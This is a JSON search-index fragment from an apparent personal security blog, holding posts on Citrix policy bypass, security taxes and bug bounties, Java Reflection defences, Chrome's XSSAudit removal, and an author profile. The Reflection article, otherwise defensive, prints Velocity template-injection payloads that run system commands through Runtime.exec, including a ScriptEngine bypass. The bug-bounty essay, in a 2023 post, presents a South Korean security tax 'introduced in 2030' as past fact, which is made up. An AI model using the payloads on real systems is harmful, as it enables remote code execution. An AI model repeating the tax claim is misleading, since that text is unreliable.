to ensure the safety of personal data. See relevant guidelines here and information on ISMS-P certification here.\nAdditional information on Citrix Common Criteria certification can be found here and here.\n","permalink":"https://windshock.github.io/en/post/2023-04-27-bypassing-citrix-policy-is-not-a-vulnerability-but-it-can-be-a-violation-of-the-law/","summary":"\u003ch3 id=\"bypassing-citrix-policy-is-not-a-vulnerability-but-a-legal-violation\"\u003eBypassing Citrix Policy is Not a Vulnerability but a Legal Violation\u003c/h3\u003e\n\u003ch4 id=\"note\"\u003eNote!!\u003c/h4\u003e\n\u003cp\u003eBased on discussions with Citrix through \u003ca href=\"https://kb.cert.org/vince/comm/case/1022/\"\u003eVINCE\u003c/a\u003e from cert.org, it was concluded that this is not classified as a vulnerability because it requires administrative privileges. Therefore, I can share this information without security concerns. However, for security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logically isolated or closed networks. If VDI must be used in such environments, please ensure that administrator privileges are removed and security-specific software is installed.\u003c/p\u003e","title":"Bypassing citrix policy is not a vulnerability, but it can be a violation of the law"},{"content":"Ôªø Strengthening Cybersecurity Through Government NGOs and Bug Bounty Programs: A Look at Security Taxes and Their Implementation in Various Countries\nIn today\u0026rsquo;s digital age, information security has become a critical concern for individuals, businesses, and governments alike. Cyber attacks and data breaches have become increasingly common and sophisticated, and the consequences can be devastating. This is why it is essential to have robust cybersecurity measures in place to protect against these threats.\nOne approach that is gaining popularity is the use of government NGOs (non-governmental organizations) and bug bounty programs. These programs are designed to encourage individuals and organizations to identify and report vulnerabilities and weaknesses in digital systems, allowing for timely and effective remediation. They are an essential component of any comprehensive cybersecurity strategy, and their importance cannot be overstated.\nIn some countries, governments have also implemented security taxes to fund these programs. These taxes are charged on businesses that are deemed to be at high risk of cyber attacks, and the proceeds are used to establish and support government NGOs and bug bounty programs. While this approach has been met with some controversy, there is no denying its effectiveness in raising the necessary funds to protect against cyber threats.\nOne example of a country that has implemented a security tax is South Korea. In 2030, the South Korean government introduced a tax on companies that are deemed to be at high risk of cyber attacks. The tax ranges from 0.09% to 2% of the company\u0026rsquo;s annual revenue, depending on their size and level of risk. The funds collected from the tax are used to support the country\u0026rsquo;s national cybersecurity agency, as well as various government NGOs and bug bounty programs.\nThe importance of NGOs in this context cannot be overstated. NGOs are essential in bridging the gap between the government and the private sector when it comes to cybersecurity. They are better equipped to handle the technical aspects of cybersecurity and can work closely with businesses and organizations to identify vulnerabilities and weaknesses in their systems. This partnership between the government and NGOs is crucial in protecting against cyber threats.\nThe R\u0026amp;R (roles and responsibilities) of government NGOs and bug bounty programs can vary depending on the country and the specific program. In general, government NGOs are responsible for conducting research and analysis on cybersecurity threats and developing best practices and guidelines. They also work closely with businesses and organizations to provide guidance and assistance in implementing these best practices.\nBug bounty programs, on the other hand, are designed to incentivize individuals and organizations to identify and report vulnerabilities in digital systems. These programs offer rewards, often in the form of cash, to those who identify and report valid vulnerabilities. This approach has proven to be highly effective in identifying and addressing vulnerabilities before they can be exploited by cybercriminals.\nIt is important to note that these programs should not charge security taxes on individuals. The burden of funding these programs should be on businesses and organizations that are at high risk of cyber attacks.\nIn summary, security taxes, NGOs, and bug bounty programs are all important tools for strengthening cybersecurity in the face of an increasingly complex threat landscape. By working together, government agencies, NGOs, and private companies can help identify and address vulnerabilities in a timely and effective manner, thereby reducing the risk of costly and damaging cyberattacks.\n","permalink":"https://windshock.github.io/en/post/2023-04-18-strengthening-cybersecurity-through-government-ngos-and-bug-bounty-programs/","summary":"\u003cp\u003eÔªø\nStrengthening Cybersecurity Through Government NGOs and Bug Bounty Programs: A Look at Security Taxes and Their Implementation in Various Countries\u003c/p\u003e\n\u003cp\u003eIn today\u0026rsquo;s digital age, information security has become a critical concern for individuals, businesses, and governments alike. Cyber attacks and data breaches have become increasingly common and sophisticated, and the consequences can be devastating. This is why it is essential to have robust cybersecurity measures in place to protect against these threats.\u003c/p\u003e","title":"Strengthening cybersecurity through government ngos and bug bounty programs"},{"content":"Security Threats and Mitigation Strategies for Java Reflection The Java Reflection API is a powerful tool that allows dynamic manipulation of classes, methods, and interfaces at runtime. However, due to its flexibility, it introduces significant security risks, as attackers can exploit it to gain unauthorized access to systems. In this article, we will explore the security threats posed by Java Reflection and outline strategies to mitigate these risks.\nThe Risks of Using Reflection API Reflection is commonly used to inspect the structure of objects or dynamically invoke methods at runtime. However, without a proper Security Manager, sensitive methods (like execute, eval, etc.) can be accessed, leading to potential Remote Code Execution (RCE) attacks.\nFor example, the following code demonstrates the risks of using Reflection to execute system commands:\n#set($exp=\u0026#34;test\u0026#34;) $exp.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;, null) .invoke(null, null) .exec(\u0026#34;calc\u0026#34;) This code uses the Velocity template engine with Reflection to execute a system command, which can be exploited by attackers if proper security measures are not in place. However, Java 9 introduced enhanced security mechanisms to mitigate such risks.\nJava 9 and the StackWalker API In Java 9, the traditional Reflection.getCallerClass method was deprecated and replaced with the StackWalker API, which provides a more secure way to inspect the calling class. Previously, security checks were only performed on the immediate caller, but with StackWalker, the entire call stack can be examined for more comprehensive security.\nFor more details, refer to the Stack Walking API guide. This ensures that all potential vulnerabilities along the call chain are addressed, as demonstrated by the CVE-2012-4681 exploit. In this vulnerability, issues with caller-sensitive methods in Java were exploited, leading to attacks, but since Java 8, the @CallerSensitive annotation has helped safeguard such methods.\nThe Problem with Blacklist-Based Security and the Need for Whitelisting Traditional blacklist-based security approaches focus on blocking specific dangerous elements but often fail to cover all attack vectors. For instance, blacklisting certain methods or classes can easily be bypassed by attackers who find alternate methods that aren\u0026rsquo;t blocked.\nExpression Language Injection and other dynamic code execution attacks frequently exploit this limitation. As demonstrated in the Blackhat JSON Attacks, blacklist filtering methods can be bypassed, and attackers can execute malicious commands through unblocked pathways.\nFor this reason, a whitelisting approach is generally more effective. Whitelisting only allows access to explicitly trusted classes and methods, while blocking everything else by default. This significantly reduces the risk of code execution through unapproved methods or reflection-based attacks.\nThe Role and Limitations of SecureUberspector SecureUberspector in Apache Velocity is a tool that limits class loading and Reflection, especially in scenarios where untrusted or numerous template writers are involved. It prevents the execution of arbitrary objects and reflection on those objects, enhancing security. However, it has limitations.\nFor example, in CVE-2019-17558, SecureUberspector could not fully block all reflection-based attacks. Particularly, it does not prevent the use of javax.script.ScriptEngineManager, which can be exploited to execute arbitrary code. GHSL-2020-048 demonstrates how attackers can bypass SecureUberspector using this vulnerability:\n#set($engine = $scriptEngineManager.getEngineByName(\u0026#34;nashorn\u0026#34;)) #engine.eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;) This script bypasses SecureUberspector and allows remote command execution. Similarly, attackers can bypass security mechanisms using Groovy scripts, as noted in the SecureLayer7 analysis.\nApplying Whitelisting: Concrete Strategies Whitelisting is the preferred security model, allowing only trusted classes, methods, and objects while blocking all others. Below are specific methods for applying whitelisting in Java.\nUsing the Security Manager\nThe Java Security Manager can be employed to restrict access to sensitive resources and only allow specific classes or methods to be executed.\nSystem.setSecurityManager(new SecurityManager()); // Define permissions for trusted methods/classes PermissionCollection perms = new Permissions(); perms.add(new RuntimePermission(\u0026#34;accessDeclaredMembers\u0026#34;)); // Allow reflection access perms.add(new RuntimePermission(\u0026#34;createClassLoader\u0026#34;)); // Allow class loader creation AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // Execute only within whitelisted methods secureMethod(); return null; } }, new AccessControlContext(new ProtectionDomain[] {new ProtectionDomain(null, perms)})); Controlling Access with Reflection\nWhen using Reflection, you can manually restrict access to certain classes and methods, rejecting any that are not explicitly allowed.\nprivate static final Set\u0026lt;String\u0026gt; allowedMethods = Set.of( \u0026#34;java.lang.String\u0026#34;, \u0026#34;java.util.List\u0026#34; // Whitelisted classes ); public static Object invokeMethod(Method method, Object target, Object... args) throws Exception { if (!allowedMethods.contains(method.getDeclaringClass().getName())) { throw new SecurityException(\u0026#34;Unauthorized method invocation: \u0026#34; + method.getName()); } return method.invoke(target, args); // Only whitelisted methods are executed } Whitelisting in Script Engines\nScript engines such as javax.script.ScriptEngineManager can also implement whitelisting to ensure that only safe scripts or commands are executed.\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;nashorn\u0026#34;); engine.setBindings(new SimpleBindings(allowedMethods), ScriptContext.ENGINE_SCOPE); // Apply whitelisting engine.eval(\u0026#34;some safe script here\u0026#34;); Whitelisting in Template Engines\nTools like SecureUberspector can be configured to enforce a whitelisting approach by limiting access to trusted methods and objects in template engines.\npublic Iterator getIterator(Object obj, Info i) { if (obj != null) { SecureIntrospectorControl sic = (SecureIntrospectorControl) introspector; if (sic.checkObjectExecutePermission(obj.getClass(), null)) { return super.getIterator(obj, i); } else { log.warn(\u0026#34;Cannot retrieve iterator from \u0026#34; + obj.getClass() + \u0026#34; due to security restrictions.\u0026#34;); } } return null; } Protecting with StackWalker: Caller Validation Introduced in Java 9, the StackWalker API provides a secure way to inspect the call stack, offering better control over method invocations. StackWalker can be used to ensure that methods are only invoked by trusted callers.\nBelow is an example using StackWalker to validate the caller of a method:\nimport java.lang.StackWalker; import java.util.List; import java.util.Set; import java.util.stream.Collectors; public class SecurityManagerUtil { // Whitelisted caller classes private static final Set\u0026lt;String\u0026gt; allowedCallers = Set.of(\u0026#34;com.example.TrustedClass\u0026#34;); public static void checkCaller() { List\u0026lt;String\u0026gt; stackTrace = StackWalker.getInstance(StackWalker.Option.RETAIN_CLASS_REFERENCE) .walk(frames -\u0026gt; frames.map(frame -\u0026gt; frame.getDeclaringClass().getName()) .collect(Collectors.toList())); // If caller is not whitelisted, throw an exception boolean isCallerAllowed = stackTrace.stream().anyMatch(allowedCallers::contains); if (!isCallerAllowed) { throw new SecurityException(\u0026#34;Unauthorized caller detected: \u0026#34; + stackTrace); } } public static void secureMethod() { checkCaller(); // Verify caller before execution System.out.println(\u0026#34;Secure method executed.\u0026#34;); } } This example ensures that only trusted classes are allowed to invoke secureMethod(). If an unauthorized class tries to access the method, an exception is thrown.\nConclusion: Proper Use and Protection of Reflection The Java Reflection API is a flexible and powerful tool, but it introduces significant security risks, especially when combined with template engines like Velocity. Blacklist-based approaches are prone to bypasses, while whitelisting provides stronger protection by allowing only trusted elements to be executed. Furthermore, leveraging the StackWalker API enhances security by validating method invocations and blocking unauthorized access.\nBy combining whitelisting with tools like StackWalker, you can ensure that your Java applications are more secure and resilient against reflection-based attacks.\n","permalink":"https://windshock.github.io/en/post/2019-09-03-security-threats-and-mitigation-strategies-for-java-reflection/","summary":"\u003ch3 id=\"security-threats-and-mitigation-strategies-for-java-reflection\"\u003eSecurity Threats and Mitigation Strategies for Java Reflection\u003c/h3\u003e\n\u003cp\u003eThe \u003cstrong\u003eJava Reflection API\u003c/strong\u003e is a powerful tool that allows dynamic manipulation of classes, methods, and interfaces at runtime. However, due to its flexibility, it introduces significant security risks, as attackers can exploit it to gain unauthorized access to systems. In this article, we will explore the security threats posed by Java Reflection and outline strategies to mitigate these risks.\u003c/p\u003e\n\u003ch4 id=\"the-risks-of-using-reflection-api\"\u003eThe Risks of Using Reflection API\u003c/h4\u003e\n\u003cp\u003eReflection is commonly used to inspect the structure of objects or dynamically invoke methods at runtime. However, without a proper \u003cstrong\u003eSecurity Manager\u003c/strong\u003e, sensitive methods (like \u003ccode\u003eexecute\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e, etc.) can be accessed, leading to potential \u003cstrong\u003eRemote Code Execution (RCE)\u003c/strong\u003e attacks.\u003c/p\u003e","title":"Security threats and mitigation strategies for java reflection"},{"content":"Why Was the XSSAudit Feature Removed in Chrome? The Google Security Team proposed to the Chrome development team to remove the XSSAudit feature. Although the only rationale provided was that the feature could be bypassed (as argued in a paper by evn@google.com), it initially seemed unlikely that removal would proceed. However, it was ultimately decided that the feature would be completely eliminated in Chrome.\nThe main point of the paper is that bypass methods using targets within new JavaScript frameworks are difficult to defend against. Therefore, it proposes a shift from the existing mitigation approach (the xssaudit filter) to an isolation/prevention method, namely Content Security Policy (CSP).\nWasn\u0026rsquo;t XSSAudit Useful? From the perspective of companies like Google, if the XSSAudit feature incurs maintenance costs and results in poorer performance compared to competitors‚Äô browsers (e.g., Microsoft‚Äôs), it is only natural to want to remove it. (In fact, this feature was already removed in MS EDGE.)\nFor ethical hackers and attackers, bypassing XSSAudit is only possible under very unusual circumstances, making the feature a particularly annoying and troublesome obstacle.\nFor security professionals and defenders, implementing the challenging CSP adds significant workload. Moreover, CSP is not a perfect defense mechanism. The Content Security Policy Level 2 RFP also describes CSP as one way to enhance defenses:\nContent Security Policy (CSP) is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth, to reduce the harm caused by content injection attacks. As a first line of defense against content injection, server operators should validate their input and encode their output.\nApart from browser developers like Google, the XSSAudit feature was useful to nearly everyone. If the only reason for its removal is that it can be bypassed, it seems like a decision driven by corporate interests. Wasn\u0026rsquo;t Google supposed to follow the motto ‚ÄúDon\u0026rsquo;t be evil, do the right thing‚Äù?\nRegardless, We Now Must Study CSP Implementation Intensively :( How do I Content Security Policy\nSo we broke all CSPs ‚Ä¶\n","permalink":"https://windshock.github.io/en/post/2019-08-08-about-the-xssaudit/","summary":"\u003ch2 id=\"why-was-the-xssaudit-feature-removed-in-chrome\"\u003eWhy Was the XSSAudit Feature Removed in Chrome?\u003c/h2\u003e\n\u003cp\u003eThe Google Security Team proposed to the Chrome development team to remove the \u003ca href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=898081\"\u003eXSSAudit feature\u003c/a\u003e. Although the only rationale provided was that the feature could be bypassed (as argued in a paper by \u003ca href=\"mailto:evn@google.com\"\u003eevn@google.com\u003c/a\u003e), it initially seemed unlikely that removal would proceed. However, it was ultimately decided that the feature would be completely eliminated in Chrome.\u003c/p\u003e\n\u003cp\u003eThe main point of the \u003ca href=\"/pdf/p1709-lekiesA.pdf\"\u003epaper\u003c/a\u003e is that bypass methods using targets within new JavaScript frameworks are difficult to defend against. Therefore, it proposes a shift from the existing mitigation approach (the xssaudit filter) to an isolation/prevention method, namely Content Security Policy (CSP).\u003c/p\u003e","title":"About the XSSAudit"},{"content":"üöÄ Security Vulnerability Analyst and Security Automation Expert üöÄ\nWith over 17 years of experience, I focus on vulnerability analysis, secure coding, and building automated security solutions. My work revolves around providing coded security solutions that help organizations address security challenges faster and more effectively. By following key security principles, I emphasize a shift-left approach to integrate security earlier in the development process, while leveraging data-driven security to build smarter systems.\nüîë Shift Left - Secure Coding Guidelines for Developers and Stakeholders: Security should be integrated early in the development process. To achieve this, I provide secure coding guidelines targeted at developers and business stakeholders, offering immediate support for addressing vulnerabilities. These guidelines help strengthen security from the initial stages of development, promoting a shift-left approach to security.\nüîë Security Automation - Building Automated Security Solutions: Security automation is critical in today‚Äôs development environments. I have established automated security solutions within DevSecOps environments, seamlessly integrating security into development pipelines. Through automated malware detection and security log analysis, I have significantly reduced manual efforts and minimized response times to security threats.\nüîë Data-Driven Security - Fortify Vulnerability Clustering and Anomalous Traffic Analysis: I focus on data-driven security and have developed tools using Fortify for vulnerability clustering and analyzing anomalous traffic. These tools allow for faster, more systematic analysis and response to security vulnerabilities, ensuring proactive prevention of security issues across various environments.\nüîë Talent Donation - CVE, CWE Reporting and GitHub Tool Sharing: I actively contribute to the security community by reporting CVE and CWE vulnerabilities. I also develop and share tools on GitHub to help others address these vulnerabilities. This talent donation strengthens the global security ecosystem and supports organizations in resolving critical security challenges.\nI am dedicated to coding solutions for discovered vulnerabilities and sharing these tools to help organizations implement effective security measures. By promoting shift-left security, security automation, and data-driven analysis, I continue to drive security innovation. Let‚Äôs connect and explore ways to enhance security together!\nüìß Email: windshock@gmail.com\nüîó Website: https://windshock.github.io/\nüíº LinkedIn: https://www.linkedin.com/in/windshock/\n","permalink":"https://windshock.github.io/en/about/","summary":"Learn more about my professional background and expertise.","title":"About"}]